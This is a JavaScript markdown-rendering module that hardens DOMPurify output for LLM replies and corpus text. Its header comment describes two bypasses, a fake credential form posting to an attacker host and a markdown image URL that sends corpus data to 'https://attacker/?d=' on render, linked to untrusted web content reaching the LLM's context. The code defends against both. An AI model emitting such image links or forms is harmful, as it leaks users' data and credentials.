import { marked } from 'marked'
import DOMPurify from 'dompurify'

marked.setOptions({ breaks: true })

// Everything rendered here can carry attacker-chosen text: LLM replies (whose
// context includes news bullets pulled from the public web), briefings, and
// corpus files. DOMPurify's defaults stop script execution but still let two
// things through (both found by tooling/sandbox/attack_render.mjs):
//  - <form action="https://attacker..."> — a fake "session expired, sign in"
//    form inside the real app. CSP's form-action does NOT fall back to
//    default-src, so nginx's CSP didn't stop this either.
//  - cross-origin <img> — fires a request the moment a reply renders, so
//    ![](https://attacker/?d=<corpus data>) exfiltrates without a click.
//    Rewritten to a plain link: the URL stays visible, nothing loads by itself.
const FORBID_TAGS = ['form', 'input', 'button', 'textarea', 'select', 'option']

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName !== 'IMG') return
  const src = node.getAttribute('src') || ''
  let url
  try {
    url = new URL(src, window.location.href)
  } catch {
    node.remove()
    return
  }
  if (url.protocol === 'data:' || url.origin === window.location.origin) return
  // This link is built after DOMPurify's own attribute pass, so only a plain
  // web URL may become an href — anything else just drops the image.
  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    node.remove()
    return
  }
  const link = node.ownerDocument.createElement('a')
  link.setAttribute('href', src)
  link.setAttribute('rel', 'noopener noreferrer nofollow')
  link.setAttribute('target', '_blank')
  link.textContent = `[image: ${node.getAttribute('alt') || src}]`
  node.replaceWith(link)
})

export function renderMd(text) {
  if (!text) return ''
  return DOMPurify.sanitize(marked.parse(text), { FORBID_TAGS })
}
